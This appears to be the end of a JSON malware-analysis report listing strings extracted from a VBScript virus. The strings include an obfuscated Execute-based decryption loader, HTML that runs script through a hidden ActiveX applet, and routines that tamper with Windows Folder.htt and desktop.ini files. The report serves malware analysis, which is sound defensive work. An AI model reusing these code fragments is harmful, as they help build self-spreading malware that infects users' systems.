            "UnLockStr = \"\"Execute(\"\"\"\"Dim KeyArr(3),ThisText\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(0) = \"\" & OtherArr(0) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(1) = \"\" & OtherArr(1) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(2) = \"\" & OtherArr(2) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(3) = \"\" & OtherArr(3) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"For i=1 To Len(ExeString)\"\"\"\"&vbCrLf&\"\"\"\"TempNum = Asc(Mid(ExeString,i,1))\"\"\"\"&vbCrLf&\"\"\"\"If TempNum = 18 Then\"\"\"\"&vbCrLf&\"\"\"\"TempNum = 34\"\"\"\"&vbCrLf&\"\"\"\"End If\"\"\"\"&vbCrLf&\"\"\"\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\"\"\"&vbCrLf&\"\"\"\"If TempChar = Chr(28) Then\"\"\"\"&vbCrLf&\"\"\"\"TempChar = vbCr\"\"\"\"&vbCrLf&\"\"\"\"ElseIf TempChar = Chr(29) Then\"\"\"\"&vbCrLf&\"\"\"\"TempChar = vbLf\"\"\"\"&vbCrLf&\"\"\"\"End If\"\"\"\"&vbCrLf&\"\"\"\"ThisText = ThisText & TempChar\"\"\"\"&vbCrLf&\"\"\"\"Next\"\"\"\")\"\" & vbCrLf & \"\"Execute(ThisText)\"\"",
            "ThisText = \"\"ExeString = \"\"\"\"\"\" & TempString & \"\"\"\"\"\"\"\"",
            "HtmlText =\"\"<\"\" & \"\"script language=vbscript>\"\" & vbCrLf & \"\"document.write \"\" & \"\"\"\"\"\"\"\" & \"\"<\"\" & \"\"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>\"\" & \"\"<\"\"\"\"&\"\"\"\"\"\" & \"\"APPLET NAME=KJ\"\"\"\"&\"\"\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"\"\"&\"\"\"\"activeX.Active\"\"\"\"&\"\"\"\"XComponent>\"\" & \"\"<\"\" & \"\"/APPLET>\"\" & \"\"<\"\" & \"\"/div>\"\"\"\"\"\" & vbCrLf & \"\"<\"\" & \"\"/script>\"\" & vbCrLf & \"\"<\"\" & \"\"script language=vbscript>\"\" & vbCrLf & ThisText & vbCrLf & UnLockStr & vbCrLf & \"\"<\"\" & \"\"/script>\"\" & vbCrLf & \"\"<\"\" & \"\"/BODY>\"\" & vbCrLf & \"\"<\"\" & \"\"/HTML>\"\"",
            "VbsText = ThisText & vbCrLf & UnLockStr & vbCrLf & \"\"KJ_start()\"\"",
            "WinPath = FSO.GetSpecialFolder(0) & \"\"\\\"\"",
            "If (FSO.FileExists(WinPath & \"\"web\\Folder.htt\"\")) Then",
            "FSO.CopyFile WinPath & \"\"web\\Folder.htt\"\",WinPath & \"\"web\\kjwall.gif\"\"",
            "End If",
            "If (FSO.FileExists(WinPath & \"\"system32\\desktop.ini\"\")) Then",
            "FSO.CopyFile WinPath & \"\"system32\\desktop.ini\"\",WinPath & \"\"system32\\kjwall.gif\"\"",
            "End If",
            "End Function\"\tString"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.364430",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
